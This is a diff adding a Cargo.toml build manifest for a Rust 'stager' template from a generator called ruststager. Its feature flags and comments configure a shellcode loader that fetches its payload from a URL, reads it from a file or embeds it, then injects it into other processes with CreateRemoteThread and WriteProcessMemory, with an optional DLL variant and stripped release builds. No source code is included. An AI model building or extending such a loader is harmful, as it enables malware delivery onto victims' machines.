@@ -1,0 +1,59 @@
+# Template of the stager program produced by ruststager.
+#
+# This is a normal cargo project: open it in your IDE and build it directly with
+#   cargo build --release                      (uses the defaults below)
+#   cargo build --release --no-default-features --features url
+#
+# The generator copies this directory verbatim and only rewrites:
+#   * the block between the `ruststager:target` markers (exe -> [[bin]], dll -> [lib] cdylib),
+#   * the `default = [...]` line of [features] (chosen mode, plus "dll"),
+#   * appends extra `--dep` lines right after `[dependencies]`.
+# Keep the markers if you edit this file.
+
+[package]
+name = "stager"
+version = "0.1.0"
+edition = "2024"
+publish = false
+build = "build.rs"
+
+# ruststager:target-begin
+[[bin]]
+name = "stager"
+path = "src/stager.rs"
+test = false
+bench = false
+# ruststager:target-end
+
+[dependencies]
+# windows-sys >= 0.60 links through `windows-link`, which uses raw-dylib:
+# no import library (.lib) is needed, so cross-linking works with rust-lld alone.
+windows-sys = { version = "0.61", default-features = false, features = [
+    "Win32_Foundation",
+    "Win32_Security",                          # SECURITY_ATTRIBUTES in CreateRemoteThread sig
+    "Win32_System_Diagnostics_Debug",          # WriteProcessMemory
+    "Win32_System_Diagnostics_ToolHelp",       # CreateToolhelp32Snapshot, Process32*, PROCESSENTRY32W
+    "Win32_System_Memory",                     # VirtualAlloc/Ex, VirtualFree, VirtualProtectEx
+    "Win32_System_Threading",                  # ExitProcess, OpenProcess, CreateRemoteThread, CreateThread
+] }
+
+[features]
+default = ["url"]
+# Exactly one source mode must be enabled.
+local = ["windows-sys/Win32_Storage_FileSystem"]          # read shellcode from RG_TARGET path at runtime
+url   = ["windows-sys/Win32_Networking_WinHttp"]          # download shellcode from RG_TARGET URL at runtime
+embed = []                                                # inject payload.bin, baked in at compile time
+# Output format: build a DLL that injects on DLL_PROCESS_ATTACH.
+dll   = ["windows-sys/Win32_System_SystemServices"]
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
+debug = false
+incremental = false
+
+[profile.dev]
+panic = "abort"
